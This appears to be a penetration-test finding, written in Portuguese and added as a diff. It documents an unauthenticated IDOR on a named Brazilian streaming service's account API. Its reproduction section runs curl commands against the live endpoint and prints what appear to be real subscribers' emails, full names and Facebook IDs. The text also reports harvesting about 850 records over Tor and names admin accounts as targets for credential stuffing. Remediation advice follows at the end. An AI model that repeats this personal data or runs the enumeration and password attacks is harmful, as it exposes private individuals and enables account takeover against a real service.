@@ -1,0 +1,85 @@
+# F-009 Unauth IDOR/BOLA on /v1/account/{id} — PII of any subscriber (email + full name + FB id + profile img)
+Alvo: https://cms.soultv.com.br/v1/account/{id}  (Django REST Framework, Cloudflare-fronted)
+Severidade: **ALTA** (PII disclosure de toda a base de assinantes — LGPD/GDPR)
+Status: Confirmado (read-only, não-destrutivo)
+Timestamp: 2026-08-27T17:10:00Z
+Descoberto por: webapp (Fase 6)
+
+## Sumário
+O endpoint `GET /v1/account/{id}` do CMS API **não exige autenticação** e retorna o perfil de
+qualquer assinante pelo seu `id` sequencial (1..~856000+): `email`, `full_name`, `first_name`,
+`last_name`, `fb_id` (Facebook user id), e `img` (URL da foto de perfil do Facebook, quando a
+conta foi criada via login social do Facebook). Como os IDs são sequenciais e inteiros
+contíguos, **toda a base de assinantes é enumerável** sem qualquer credencial, vazando PII
+(nome real + e-mail) de centenas de milhares de usuários — violação grave de LGPD/GDPR e
+material para phishing/credential-stuffing/de-anonimização.
+
+Importante: o endpoint responde `200`/`success:true` **mesmo sem header `Authorization`** — o
+IDOR não depende do token obtido em F-007; é unauth.
+
+## Reprodução (read-only)
+```bash
+# Sem qualquer token — usuário admin interno
+$ curl -s https://cms.soultv.com.br/v1/account/1
+{"success":true,"data":{"id":1,"email":"admin@tv.com","full_name":" ","first_name":"","last_name":"","fb_id":"","img":""}}
+
+$ curl -s https://cms.soultv.com.br/v1/account/2
+{"success":true,"data":{"id":2,"email":"marketing@tv.com",...}}
+
+# Assinante real com login Facebook (FB id + foto de perfil vazados)
+$ curl -s https://cms.soultv.com.br/v1/account/25
+{"success":true,"data":{"id":25,"email":"indign_@naver.com","full_name":"유주 ","first_name":"유주",
+ "last_name":"","fb_id":"572131383219208",
+ "img":"https://graph.facebook.com/572131383219208/picture?redirect=true&type=large&height=200&width=200"}}
+
+# Assinante real (PII de pagamento)
+$ curl -s https://cms.soultv.com.br/v1/account/790279
+{"success":true,"data":{"id":790279,"email":"amilcarfernandeslopo@gmail.com",
+ "full_name":"Amilcar Fernandes Mendes Lopo ","...}}
+
+$ curl -s https://cms.soultv.com.br/v1/account/856424
+{"success":true,"data":{"id":856424,"email":"edsonmareri4@gmail.com",
+ "full_name":"Edson Mareri Oliveira Da Silva ",...}}
+```
+- `id=17..18` → `test@soultv.com.br`, `test2@soultv.com.br` (contas internas de teste).
+- `id=1,2` → `admin@tv.com`, `marketing@tv.com` (contas admin/internas — targets de ATO).
+- IDs sequenciais contíguos 1..~856000 confirmam escala da base (ver F-010).
+
+## Enumeração em massa (amostra)
+- Foram coletados (read-only, via Tor) registros de `id=1..~850` + IDs de relatórios financeiros
+  (F-010) → `enum/webapp/bola/accounts_dump.txt` (224 KB), `emails.txt` (~29 KB — centenas de
+  e-mails únicos), `fb_ids.txt` (Facebook IDs de usuários que logaram via FB).
+- **Nenhuma conta foi criada/modificada.** Apenas `GET` enumerativo. Nenhum dado gravado no alvo.
+- **Não foi feito o dump completo de ~856K contas** (OPSEC não-destrutivo + volume): a prova
+  de conceito (PoC) com poucas dezenas de IDs é suficiente para evidenciar a vulnerabilidade e
+  a escala; a enumerabilidade foi confirmada para IDs altos (790279, 853940, 856424).
+
+## Impacto
+- **PII massiva vazada sem auth**: nome real + e-mail (e, para logins FB, o `fb_id` + URL da
+  foto de perfil — permite de-anonimização cruzada com o Facebook/Graph API) de toda a base
+  de assinantes de um serviço de streaming pago (IPTV/PPV).
+- **Violação LGPD (Brasil) / GDPR**: dados pessoais de cidadãos brasileiros expostos sem
+  salvaguardas. Base potencial para notificação à ANPD.
+- **Material para ataques subsequentes**: lista de e-mails reais + nomes para
+  credential-stuffing (F-007 dá a superfície de signin sem captcha), phishing personalizado,
+  account takeover via reset de senha (F-E03), e correlação com registros financeiros (F-010).
+- **Alvos internos vazados**: `admin@tv.com`, `marketing@tv.com`, `test@soultv.com.br` —
+  candidatos a ATO admin (testar senha fraca / cred-stuffing).
+
+## Recomendação
+1. Exigir autenticação (`Authorization: Token`) E autorização (o usuário só pode ler o
+   PRÓPRIO perfil — comparar `id` do path com o `id` do token): nunca servir `/account/{id}`
+   de outro usuário, mesmo autenticado.
+2. Remover `fb_id` e `img` (URL FB) de qualquer resposta de API pública — são dados
+   sensíveis de identidade.
+3. Implementar rate-limiting / WAF rule para bloquear enumeração sequencial de IDs em
+   `/v1/account/`.
+4. Notificar a ANPD se confirmado vazamento de PII em escala (LGPD art. 48).
+5. Forçar rotatividade/verificação das contas internas (`admin@tv.com`, etc.).
+
+## Artefatos
+- `enum/webapp/bola/accounts_dump.txt` — amostra de respostas (id|json)
+- `enum/webapp/bola/emails.txt` — e-mails únicos extraídos (amostra)
+- `enum/webapp/bola/fb_ids.txt` — Facebook IDs extraídos (amostra)
+
+## Severidade: ALTA (PII disclosure não-autenticado, escala ~856K, LGPD)
